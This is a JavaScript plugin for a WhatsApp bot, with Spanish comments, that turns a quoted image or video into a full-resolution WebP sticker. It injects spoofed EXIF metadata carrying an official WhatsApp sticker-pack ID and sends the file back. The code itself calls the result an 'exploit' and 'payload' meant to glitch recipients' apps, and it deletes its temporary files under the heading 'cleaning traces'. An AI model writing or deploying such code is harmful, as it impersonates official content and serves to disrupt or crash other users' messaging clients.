// plugins/sticker_glitch.js
const fs = require('fs');
const { exec } = require('child_process');
const util = require('util');
const execPromise = util.promisify(exec);

// Generador del Payload EXIF falso
const createSpoofedExif = (packname, author) => {
    const json = {
        "sticker-pack-id": "com.whatsapp.stickers.chomp", // ID oficial spoofed
        "sticker-pack-name": packname,
        "sticker-pack-publisher": author,
        "emojis": ["💀", "💥"]
    };
    const jsonStr = JSON.stringify(json);
    // Cabecera estándar EXIF para WebP en WhatsApp
    const exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00]);
    const jsonBuff = Buffer.from(jsonStr, 'utf-8');
    const exif = Buffer.concat([exifAttr, jsonBuff, Buffer.from([0x00])]);
    exif.writeUIntLE(jsonBuff.length, 14, 4);
    return exif;
};

module.exports = {
    name: 'sticker_glitch',
    match: (text, { quoted, getMediaInfo }) => text.toLowerCase() === 'sg' && quoted && getMediaInfo(quoted),
    execute: async ({ sock, remitente, quoted, getMediaInfo, downloadContentFromMessage }) => {
        const mediaInfo = getMediaInfo(quoted);
        if (mediaInfo.type !== 'image' && mediaInfo.type !== 'video') return;

        let statusMsg = await sock.sendMessage(remitente, { text: "⏳ Forzando exploit Chomp en el servidor..." });
        
        const idStr = Date.now().toString();
        const inputPath = `temp_in_${idStr}`;
        const tempWebpPath = `temp_raw_${idStr}.webp`;
        const exifPath = `temp_exif_${idStr}.exif`;
        const outputPath = `temp_out_${idStr}.webp`;

        try {
            // 1. Descargar media
            const stream = await downloadContentFromMessage(mediaInfo.msg, mediaInfo.type);
            let buffer = Buffer.from([]);
            for await(const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
            fs.writeFileSync(inputPath, buffer);

            const isVideo = mediaInfo.type === 'video';
            
            // 2. Convertir a WebP SIN escalar (mantiene la resolución masiva original) y con alta calidad
            const cmdFfmpeg = isVideo 
                ? `ffmpeg -i "${inputPath}" -vcodec libwebp -lossless 0 -compression_level 4 -q:v 85 -loop 0 -preset picture -an -t 5 "${tempWebpPath}" -y`
                : `ffmpeg -i "${inputPath}" -vcodec libwebp -lossless 0 -compression_level 4 -q:v 85 -preset picture -an "${tempWebpPath}" -y`;

            await execPromise(cmdFfmpeg);

            // 3. Crear el archivo EXIF con la metadata falsa
            fs.writeFileSync(exifPath, createSpoofedExif("Chomp", "whatsapp plus"));

            // 4. Inyectar el EXIF en el WebP usando webpmux
            try {
                await execPromise(`webpmux -set exif "${exifPath}" "${tempWebpPath}" -o "${outputPath}"`);
            } catch (muxError) {
                console.error("Fallo crítico: webpmux no está instalado en el sistema. Enviando versión sin inyectar.", muxError);
                // Fallback por si no instalaste 'webp' en el SO, aunque el glitch requerirá el EXIF
                fs.renameSync(tempWebpPath, outputPath);
            }

            // 5. Enviar el payload final
            await sock.sendMessage(remitente, { sticker: { url: outputPath } });
            await sock.sendMessage(remitente, { delete: statusMsg.key });

        } catch (err) {
            console.error("Error en la generación:", err);
            await sock.sendMessage(remitente, { text: "❌ Fallo al procesar el exploit." });
        } finally {
            // Limpieza de rastros
            [inputPath, tempWebpPath, exifPath, outputPath].forEach(file => {
                if (fs.existsSync(file)) fs.unlinkSync(file);
            });
        }
    }
};
